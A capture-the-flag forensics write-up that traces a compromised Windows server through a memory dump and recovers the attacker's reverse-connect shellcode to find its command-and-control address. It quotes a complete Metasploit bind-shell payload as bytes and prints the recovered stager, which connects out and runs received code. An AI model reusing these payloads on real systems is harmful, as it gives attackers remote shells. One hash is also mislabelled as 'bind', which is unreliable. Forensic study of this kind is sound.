---
title: "Shadow Cache - QnQSec CTF 2025"
category: "forensics"
subcategory: "shellcode"
type: "writeup"
tags: ["forensics", "forensic", "shellcode", "xor", "buffer-overflow", "ghidra", "volatility", "memory-forensics", "wayback", "qnqsec-ctf", "qnqsec-ctf-2025", "2025", "ctf-writeup"]
summary: "To begin, VolWeb was used, which provides a graphical interface that helps in finding suspicious elements."
source:
  name: "CTFtime writeup #40449"
  url: "https://ctftime.org/writeup/40449"
original_source: "https://nolliv22.com/writeups/qnqsec%20ctf%202025/shadow-cache"
ctf:
  name: "QnQSec CTF 2025"
  year: 2025
  challenge: "Shadow Cache"
---

## Metadata

- **CTF:** QnQSec CTF 2025
- **Task:** Shadow Cache
- **Author team:** Oppida
- **CTFtime tags:** forensic, shellcode
- **CTFtime:** <https://ctftime.org/writeup/40449>
- **Original writeup:** <https://nolliv22.com/writeups/qnqsec%20ctf%202025/shadow-cache>

---
## 1. Initial analysis

To begin, [VolWeb](<https://github.com/k1nd0ne/VolWeb>) was used, which provides a graphical interface that helps in finding suspicious elements.

![VolWeb Investigation view](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/volweb.png>)

The process tree revealed the `S1r-APP.exe` process. This appeared to be the application built by the software engineer.

The process was dumped to get the binary for further analysis:  
```bash  
vol -f memdump.mem -o dump/4324 windows.dumpfiles --pid 4324  
mv file.0xe000255bf8a0.0xe00026a401a0.ImageSectionObject.S1r-APP.exe.img S1r-APP.exe  
```

A quick look at the binary's strings revealed the following information:  
```bash  
$ strings dump/4324/S1r-APP.exe  
[...]  
Usage: %s [port_number]  
If no port number is provided, the default port of %s will be used.  
9999  
1.00  
S3cret Fl4glnserver version %s  
QnQSec{FL@G_nerable software!  
Do not allow access from untrusted systems or networks!  
WSAStartup failed with error: %d  
Getaddrinfo failed with error: %d  
Socket failed with error: %ld  
Bind failed with error: %d  
Listen failed with error: %d  
Waiting for client connections...  
Accept failed with error: %d  
Received a client connection from %s:%u  
Welcome to S1r-Arable Server! Enter HELP for help.  
Send failed with error: %d  
HELP  
Command specific help has not been implemented  
HELP  
Valid Commands:  
HELP  
STATS [stat_value]  
RTIME [rtime_value]  
LTIME [ltime_value]  
SRUN [srun_value]  
TRUN [trun_value]  
GMON [gmon_value]  
GDOG [gdog_value]  
KSTET [kstet_value]  
GTER [gter_value]  
HTER [hter_value]  
LTER [lter_value]  
KSTAN [lstan_value]  
EXIT  
STATS  
STATS VALUE NORMAL  
RTIME  
RTIME VALUE WITHIN LIMITS  
LTIME  
LTIME VALUE HIGH, BUT OK  
SRUN  
SRUN COMPLETE  
TRUN  
TRUN COMPLETE  
GMON  
GMON STARTED  
GDOG  
GDOG RUNNING  
KSTET  
KSTET SUCCESSFUL  
GTER  
GTER ON TRACK  
HTER  
HTER RUNNING FINE  
LTER  
LTER COMPLETE  
KSTAN  
KSTAN UNDERWAY  
EXIT  
GOODBYE  
Connection closing...  
EXECUTE COMMAND  
Recv failed with error: %d  
[...]  
```

\- The program starts a local server and waits for a connection.  
\- Once connected, it executes predefined commands.

Indeed, the process is listening on the default port 9999:  
```bash  
$ vol -f memdump.mem windows.netscan  
[...]  
0xe0002662b530 TCPv4 0.0.0.0 9999 0.0.0.0 0 LISTENING 4324 S1r-APP.exe 2025-10-16 05:44:16.000000 UTC  
[...]  
```

Since the program appears to log client connections, it's possible to find these connections by searching for the log message in the memory dump:  
```bash  
$ cat memdump.mem | grep -a "Received a client connection from"  
Received a client connection from %s:%u  
��{#���|�s�{�?DS��  
j��S�v�p�ZpZH��{# 9�\Õ{#��d�~��j������p�  
�␦?n7QE�]���pOp�  
�{#���}t��Q����N��p���E���  
�����mB0@����]������Q���Received a client connection from 137.50.21.11:34264  
��LP�� -���He��  
�^�LP��p2���Ha��  
���Xf.������LP������LP�����H5����?���10��Pa���1���Received a client connection from 137.50.21.11:50246  
```

Two connections were found. Is this the end? Unfortunately not. Even if one of the clients compromised the server, this only provides the attacker's IP and port, not the C2's.

![Initial analysis](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/initial_analysis.png>)

After this, the binary was decompiled for a more detailed analysis hoping to find other connections, but this yielded no results.

## 2. Vulnserver

While looking through the output of Volatility plugins in VolWeb, a Dynamic-Link Library named `essfunc.dll` was noticed in the same directory as the binary. It appeared to be used by the application:

![Filescan](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/filescan.png>)

A quick search for the library's name to check if it was a common Windows library led to its GitHub repository:

![essfunc.dll search result](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/vulnserver.png>)

[stephenbradshaw/vulnserver](<https://github.com/stephenbradshaw/vulnserver>) is an intentionally vulnerable server, and `essfunc.dll` is the library used by the main program `vulnserver.exe` that contains all the functions vulnerable to buffer overflows.

This clarifies the situation and fits the challenge description:  
\- The software engineer used `essfunc.dll` from `vulnserver` to build the application.  
\- The system was compromised due to the buffer overflow vulnerabilities in the `essfunc.dll` library.

![Vulnserver recap](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/vulnserver_recap.png>)

The `vulnserver` repository provides some [articles]((<https://github.com/stephenbradshaw/vulnserver#exploiting-vulnserver>)) that describe possible exploitation of the server.   
Based on the assumption that the attacker followed one of these guides, the next step was to search for traces of such an exploit in memory.

## 3. Shellcode  
[One of the exploitation guides](<https://web.archive.org/web/20110314192325/http://resources.infosecinstitute.com/stack-based-buffer-overflow-tutorial-part-3-%E2%80%94-adding-shellcode/>) contains the following shellcode snippet:

```bash  
stephen@bt:~$ msfpayload windows/shell_bind_tcp LPORT=4444 P  
# windows/shell_bind_tcp - 341 bytes  
# <http://www.metasploit.com>  
# AutoRunScript=, EXITFUNC=process, InitialAutoRunScript=,  
# LPORT=4444, RHOST=  
my $buf =  
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" .  
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" .  
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" .  
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" .  
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" .  
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" .  
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" .  
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" .  
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" .  
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" .  
"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" .  
"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" .  
"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" .  
"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" .  
"\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" .  
"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" .  
"\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" .  
"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" .  
"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" .  
"\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" .  
"\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" .  
"\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" .  
"\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" .  
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" .  
"\x6a\x00\x53\xff\xd5";  
```

To check if the attacker used a similar shellcode, it is possible to search for specific bytes from this snippet in the memory dump.

The chosen bytes are from the beginning of the shellcode: `b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"`.

While it is not guaranteed that the attacker used the exact same shellcode, it is likely that parts of it, such as the beginning, are common.

Searching for this pattern in the memory dump revealed one potential match:  
```python  
memdump = open("memdump.mem", "rb").read()  
shellcode_part = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"  
memdump.index(shellcode_part)  
# 1234396449  
```

This [article on how to use Ghidra to analyze shellcode](<https://www.embeeresearch.io/ghidra-basics-shellcode-analysis/>) was followed.  
Following the article's steps, disassembling the shellcode found in the memory dump produced the following output:

```  
//  
// ram   
// ram:00000000-ram:00000154  
//  
*************************************************************  
* FUNCTION   
*************************************************************  
undefined FUN_00000000 ()  
undefined <UNASSIGNED> <RETURN>  
FUN_00000000  
00000000 fc CLD  
00000001 e8 89 00 CALL FUN_0000008f undefined FUN_0000008f()  
00 00  
00000006 60 PUSHAD  
00000007 89 e5 MOV EBP ,ESP  
00000009 31 d2 XOR EDX ,EDX  
0000000b 64 8b 52 30 MOV EDX ,dword ptr FS:[EDX + 0x30 ]  
0000000f 8b 52 0c MOV EDX ,dword ptr [EDX + 0xc ]  
00000012 8b 52 14 MOV EDX ,dword ptr [EDX + 0x14 ]  
LAB_00000015 XREF[1]: 0000008d (j)   
00000015 8b 72 28 MOV ESI ,dword ptr [EDX + 0x28 ]  
00000018 0f b7 4a 26 MOVZX ECX ,word ptr [EDX + 0x26 ]  
0000001c 31 ff XOR EDI ,EDI  
LAB_0000001e XREF[1]: 0000002c (j)   
0000001e 31 c0 XOR EAX ,EAX  
00000020 ac LODSB ESI  
00000021 3c 61 CMP AL,0x61  
00000023 7c 02 JL LAB_00000027  
00000025 2c 20 SUB AL,0x20  
LAB_00000027 XREF[1]: 00000023 (j)   
00000027 c1 cf 0d ROR EDI ,0xd  
0000002a 01 c7 ADD EDI ,EAX  
0000002c e2 f0 LOOP LAB_0000001e  
0000002e 52 PUSH EDX  
0000002f 57 PUSH EDI  
00000030 8b 52 10 MOV EDX ,dword ptr [EDX + 0x10 ]  
00000033 8b 42 3c MOV EAX ,dword ptr [EDX + 0x3c ]  
00000036 01 d0 ADD EAX ,EDX  
00000038 8b 40 78 MOV EAX ,dword ptr [EAX + 0x78 ]  
0000003b 85 c0 TEST EAX ,EAX  
0000003d 74 4a JZ LAB_00000089  
0000003f 01 d0 ADD EAX ,EDX  
00000041 50 PUSH EAX  
00000042 8b 48 18 MOV ECX ,dword ptr [EAX + 0x18 ]  
00000045 8b 58 20 MOV EBX ,dword ptr [EAX + 0x20 ]  
00000048 01 d3 ADD EBX ,EDX  
LAB_0000004a XREF[1]: 00000066 (j)   
0000004a e3 3c JECXZ LAB_00000088  
0000004c 49 DEC ECX  
0000004d 8b 34 8b MOV ESI ,dword ptr [EBX + ECX *0x4 ]  
00000050 01 d6 ADD ESI ,EDX  
00000052 31 ff XOR EDI ,EDI  
LAB_00000054 XREF[1]: 0000005e (j)   
00000054 31 c0 XOR EAX ,EAX  
00000056 ac LODSB ESI  
00000057 c1 cf 0d ROR EDI ,0xd  
0000005a 01 c7 ADD EDI ,EAX  
0000005c 38 e0 CMP AL,AH  
0000005e 75 f4 JNZ LAB_00000054  
00000060 03 7d f8 ADD EDI ,dword ptr [EBP + -0x8 ]  
00000063 3b 7d 24 CMP EDI ,dword ptr [EBP + 0x24 ]  
00000066 75 e2 JNZ LAB_0000004a  
00000068 58 POP EAX  
00000069 8b 58 24 MOV EBX ,dword ptr [EAX + 0x24 ]  
0000006c 01 d3 ADD EBX ,EDX  
0000006e 66 8b 0c 4b MOV CX,word ptr [EBX + ECX *0x2 ]  
00000072 8b 58 1c MOV EBX ,dword ptr [EAX + 0x1c ]  
00000075 01 d3 ADD EBX ,EDX  
00000077 8b 04 8b MOV EAX ,dword ptr [EBX + ECX *0x4 ]  
0000007a 01 d0 ADD EAX ,EDX  
0000007c 89 44 24 24 MOV dword ptr [ESP + 0x24 ],EAX  
00000080 5b POP EBX  
00000081 5b POP EBX  
00000082 61 POPAD  
00000083 59 POP ECX  
00000084 5a POP EDX  
00000085 51 PUSH ECX  
00000086 ff e0 JMP EAX  
LAB_00000088 XREF[1]: 0000004a (j)   
00000088 58 POP EAX  
LAB_00000089 XREF[1]: 0000003d (j)   
00000089 5f POP EDI  
0000008a 5a POP EDX  
0000008b 8b 12 MOV EDX ,dword ptr [EDX ]  
0000008d eb 86 JMP LAB_00000015  
*************************************************************  
* FUNCTION   
*************************************************************  
undefined FUN_0000008f ()  
undefined <UNASSIGNED> <RETURN>  
undefined4 Stack[-0x8]:4 local_8 XREF[1]: 0000009a (*)   
FUN_0000008f XREF[1]: FUN_00000000:00000001 (c)   
0000008f 5d POP EBP  
00000090 68 33 32 PUSH 0x3233  
00 00  
00000095 68 77 73 PUSH 0x5f327377  
32 5f  
0000009a 54 PUSH ESP =>local_8  
0000009b 68 4c 77 PUSH 0x726774c  
26 07  
000000a0 ff d5 CALL EBP  
000000a2 b8 90 01 MOV EAX ,0x190  
00 00  
000000a7 29 c4 SUB ESP ,EAX  
000000a9 54 PUSH ESP  
000000aa 50 PUSH EAX  
000000ab 68 29 80 PUSH 0x6b8029  
6b 00  
000000b0 ff d5 CALL EBP  
000000b2 50 PUSH EAX  
000000b3 50 PUSH EAX  
000000b4 50 PUSH EAX  
000000b5 50 PUSH EAX  
000000b6 40 INC EAX  
000000b7 50 PUSH EAX  
000000b8 40 INC EAX  
000000b9 50 PUSH EAX  
000000ba 68 ea 0f PUSH 0xe0df0fea  
df e0  
000000bf ff ?? FFh <= Not part of the shellcode  
000000c0 ac ?? ACh  
000000c1 21 4c 65 ds "!Leivion.H"  
69 76 69   
6f 6e 2e   
000000cc 02 ?? 02h ? -> 00000002  
000000cd 00 ?? 00h  
000000ce 00 ?? 00h  
```

Compared to the disassembled shellcode from the guide, the recovered shellcode begins to differ at offset `0xbf`, followed by bytes Ghidra could not disassemble. This is likely because the analysis was done on the entire memory dump, where memory from different processes can be mixed, rather than on a single process.

![Memory dump visualization](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/memory_view.png>)

This partial shellcode provides confidence that the attacker used a similar method to exploit the buffer overflow vulnerability. The next step is to recover the complete shellcode from the specific process's memory, not the entire memory dump, to find the C2 server's IP and port.

To dump the process memory:  
```bash  
$ vol -f memdump.mem -o dump/4324 windows.memmap --dump --pid 4324  
```

However, searching for the shellcode's beginning bytes within the process's memory dump yielded no results.  
After reducing the pattern to just `b"\xfc\xe8\x89\x00\x00\x00"`, one match was found. However, this pattern is too short to be conclusive, and the match could be a coincidence. Dumping more bytes of this potential shellcode and using `pwntools`'s `disasm` for a quick analysis showed that it did not match the shellcode from the guide:  
```bash  
from pwn import disasm  
memdump = open("dump/4324/pid.4324.dmp", "rb").read()  
shellcode_part = b"\xfc\xe8\x89\x00\x00\x00"  
i = memdump.index(shellcode_part)  
print(disasm(memdump[i: i+400]))

0: fc cld  
1: e8 89 00 00 00 call 0x8f  
6: 8b 4d fc mov ecx, DWORD PTR [ebp-0x4]  
9: 8b d8 mov ebx, eax  
b: 85 db test ebx, ebx  
d: 0f 85 bc ef 00 00 jne 0xefcf  
13: 8b 31 mov esi, DWORD PTR [ecx]  
15: 8b 7d 0c mov edi, DWORD PTR [ebp+0xc]  
[...]  
```

At this point, the technique of using the beginning bytes of a known shellcode failed. A different method was needed to identify the attacker's shellcode within the process dump.

*Note: The reason for this failure was only understood after recovering the actual shellcode. The called address is not fixed at `0x89` (FUN_0000008f) and can vary.*

## 4. Function Name Hashing  
The general structure of the shellcode was known, but more detail was needed to pinpoint it in the process memory.

While searching for a way to locate the attacker's shellcode, the structure of Windows shellcode was analyzed further.

One key concept is the [**function name hashing** technique](<https://www.bordergate.co.uk/function-name-hashing/>) used in malware. Instead of using easily detectable library and function names directly, malware uses hashes to call functions from libraries.

DLLs export an Export Address Table (EAT), which contains a mapping of function names to the addresses of the functions in the library.  
When malware needs to call a function using a hash, it iterates through the EAT of loaded libraries, computes the hash for each function name, and checks for a match. The algorithm used for hashing is [ROR13](<https://asecuritysite.com/hash/ror13_2>).

In the assembly code, the hash of a function is always pushed and then called:  
```  
0000009b 68 4c 77 PUSH 0x726774c <= PUSH Function hash  
26 07  
000000a0 ff d5 CALL EBP <= CALL  
000000a2 b8 90 01 MOV EAX ,0x190  
00 00  
000000a7 29 c4 SUB ESP ,EAX  
000000a9 54 PUSH ESP  
000000aa 50 PUSH EAX  
000000ab 68 29 80 PUSH 0x6b8029 <= PUSH Function hash  
6b 00  
000000b0 ff d5 CALL EBP <= CALL  
```

At this point, two crucial pieces of information were established:  
1\. The attacker likely used a shellcode similar to the one in the exploitation guide.  
2\. The shellcode contains function hashes that correspond to functions in some libraries.

Based on this information, the complete shellcode from the guide can be analyzed to recover library and function names from their hashes. Assuming the attacker's shellcode shares a similar logic, a search can then be performed for a crucial function hash within the process memory.

[speakeasy](<https://github.com/mandiant/speakeasy>), an emulator that allows running shellcode directly, was used to resolve the hashes and retrieve the library and function names.  
```bash  
$ speakeasy -t guide_shellcode -r -a x86  
* exec: shellcode  
0x10a2: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000  
0x10b2: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0  
0x10c1: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4  
0x10d8: 'ws2_32.bind(0x4, "0.0.0.0:4444", 0x10)' -> 0x0  
0x10e1: 'ws2_32.listen(0x4, 0x0)' -> 0x0  
0x10eb: 'ws2_32.accept(0x4, 0x0, 0x0)' -> 0x8  
0x10f5: 'ws2_32.closesocket(0x4)' -> 0x0  
0x1128: 'kernel32.CreateProcessA(0x0, "cmd", 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1203dfc, 0x1203dec)' -> 0x1  
0x1136: 'kernel32.WaitForSingleObject(0x220, 0xffffffff)' -> 0x0  
0x1142: 'kernel32.GetVersion()' -> 0x1db10106  
0x1155: 'kernel32.ExitProcess(0x0)' -> 0x0  
* Finished emulating  
```

Using [a script to compute the ROR13 hash](<https://www.bordergate.co.uk/function-name-hashing/>), a mapping of functions to their ROR13 hashes from the guide's shellcode was obtained:  
```  
kernel32.LoadLibraryA => 0x0726774c  
ws2_32.WSAStartup => 0x006b8029  
ws2_32.WSASocketA => 0xe0df0fea  
ws2_32.bind => 0x6737dbc2  
ws2_32.listen => 0xff38e9b7  
ws2_32.accept => 0xe13bec74  
ws2_32.closesocket => 0x614d6e75  
kernel32.CreateProcessA => 0x863fcc79  
kernel32.WaitForSingleObject => 0x601d8708  
kernel32.GetVersion => 0x9dbd95a6  
kernel32.ExitProcess => 0x56a2b5f0  
```

![Function name hash](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/function_name_hash.png>)

Two hashes were recovered from the partial shellcode: `kernel32.LoadLibraryA (0x0726774c)` and `ws2_32.WSAStartup (0x006b8029)`.  
The shellcode uses functions from the `ws2_32` library to initiate a connection with the C2 server.

## 5. Recover the shellcode  
The next step is to search for hashes of functions from the `ws2_32` library that the attacker's shellcode would likely use.  
There are two possible functions involving the C2 IP and port in the `ws2_32` library:  
\- `int bind(SOCKET s, const sockaddr *addr, int namelen);`  
\- `int connect(SOCKET s, const sockaddr *addr, int namelen);`

Once an instance of these hashes is found in the process memory, the full shellcode can be recovered. The previous analysis of the guide's shellcode revealed its starting and ending byte patterns, which helps to isolate the complete payload.

![Recover shellcode from knwon hashes](<<https://nolliv22.com/assets/static/writeups/2025/QnQSec> CTF 2025/recover_shellcode.png>)

The following script was used to recover the shellcodes:  
```python  
from pwn import disasm

def h2b(h):  
return bytes.fromhex(h)

def find(data: bytes, pattern: bytes) -> list[int]:  
indexes = []  
start_index = 0  
while True:  
index = data.find(pattern, start_index)  
if index == -1:  
break  
indexes.append(index)  
start_index = index + 1  
return indexes

procdump = open("dump/4324/pid.4324.dmp", "rb").read()

func_hashes = {  
# Little-endian  
"bind": h2b("0726774c")[::-1],  
"connect": h2b("6174a599")[::-1]  
}

known_start = b"\xfc\xe8" # cld; call  
knwon_end = b"\x6a\x00\x53\xff\xd5" # push 0x0; push ebx; call ebp

for func, hash in func_hashes.items():  
for offset in [find(procdump, b"\x68"+hash)[0]]:  
print(f"Found occurence of {func}'s hash at offset {offset}")  
shellcode_area = procdump[offset-1000: offset+1000]  
start = shellcode_area.index(known_start)  
end = shellcode_area.index(knwon_end) + len(knwon_end)  
recovered_shellcode = shellcode_area[start: end]  
print(disasm(recovered_shellcode))  
open(f"recovered_shellcode_{func}", "wb").write(recovered_shellcode)  
```

A total of four potential shellcode instances were found. However, they all corresponded to a single distinct shellcode, as both the `bind` and `connect` hashes were present within it.  
```  
Found occurence of bind's hash at offset 183954  
0: fc cld  
1: e8 8f 00 00 00 call 0x95  
[...]  
a1: 68 4c 77 26 07 push 0x726774c <= hash of ws2_32.bind  
a6: 89 e8 mov eax, ebp  
a8: ff d0 call eax  
aa: b8 90 01 00 00 mov eax, 0x190  
af: 29 c4 sub esp, eax  
b1: 54 push esp  
b2: 50 push eax  
b3: 68 29 80 6b 00 push 0x6b8029  
b8: ff d5 call ebp  
ba: 6a 0a push 0xa  
bc: 68 78 cf 0b 6b push 0x6b0bcf78  
c1: 68 02 00 07 67 push 0x67070002  
c6: 89 e6 mov esi, esp  
c8: 50 push eax  
c9: 50 push eax  
ca: 50 push eax  
cb: 50 push eax  
cc: 40 inc eax  
cd: 50 push eax  
ce: 40 inc eax  
cf: 50 push eax  
d0: 68 ea 0f df e0 push 0xe0df0fea  
d5: ff d5 call ebp  
d7: 97 xchg edi, eax  
d8: 6a 10 push 0x10  
da: 56 push esi  
db: 57 push edi  
dc: 68 99 a5 74 61 push 0x6174a599 <= hash of ws2_32.connect  
[...]  
15d: 6a 00 push 0x0  
15f: 53 push ebx  
160: ff d5 call ebp  
Found occurence of bind's hash at offset 87744877  
[...]  
Found occurence of connect's hash at offset 184013  
[...]  
Found occurence of connect's hash at offset 87744936  
[...]  
```

The recovered shellcode is available [here]({{site.url}}/assets/static/writeups/2025/QnQSec CTF 2025/recovered_shellcode).

## 6. C2 Server IP and Port

### 6.1. Using emulation  
Emulating the shellcode in `speakeasy` revealed the C2 IP and port:  
```bash  
$ speakeasy -r -a x86 -t recovered_shellcode  
* exec: shellcode  
0x10aa: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000  
0x10ba: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0  
0x10d7: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4  
0x10e3: 'ws2_32.connect(0x4, "120.207.11.107:1895", 0x10)' -> 0x0  
0x10fe: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4  
0x1116: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000  
0x1124: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8  
0x50008: Unhandled interrupt: intnum=0x3  
0x50008: shellcode: Caught error: unhandled_interrupt  
* Finished emulating  
```

### 6.2. Manual analysis  
Two values are pushed successively in the assembly code between the calls to `bind` and `connect`:  
```  
a1: 68 4c 77 26 07 push 0x726774c <= hash of ws2_32.bind  
[...]  
bc: 68 78 cf 0b 6b push 0x6b0bcf78  
c1: 68 02 00 07 67 push 0x67070002  
[...]  
dc: 68 99 a5 74 61 push 0x6174a599 <= hash of ws2_32.connect  
```

As observed in the analysis of the guide's shellcode, the `AF_INET` value (`0x0002`) can be identified within the pushed data `0x67070002`. This indicates the shellcode is building a `SOCKADDR_IN` structure, which is defined in [winsock.h](<https://learn.microsoft.com/fr-fr/windows/win32/api/winsock/ns-winsock-sockaddr_in>) as follows:  
```c  
typedef struct sockaddr_in {  
short sin_family;  
u_short sin_port;  
struct in_addr sin_addr;  
char sin_zero[8];  
} SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;  
```

This allows for the recovery of the IP and the port:  
\- `0x67070002`:  
\- Port: `0x6707` -> `0x0767` (little-endian) -> `1895`  
\- Family: `0x0002` -> `AF_INET`  
\- IP: `0x6b0bcf78` -> `0x78cf0b6b` (little-endian) -> `0x78.0xcf.0x0b.0x6b` -> `120.207.11.107`

Flag: `QnQSec{120.207.11.107:1895}`

## Useful resources and tools  
\- [Volatility cheatsheet](<https://blog.onfvp.com/post/volatility-cheatsheet/>)  
\- [VolWeb](<https://github.com/k1nd0ne/VolWeb>)  
\- [speakeasy](<https://github.com/mandiant/speakeasy>)  
\- [Ghidra shellcode analysis](<https://www.embeeresearch.io/ghidra-basics-shellcode-analysis/>)  
\- [Function Name Hashing](<https://www.bordergate.co.uk/function-name-hashing/>)
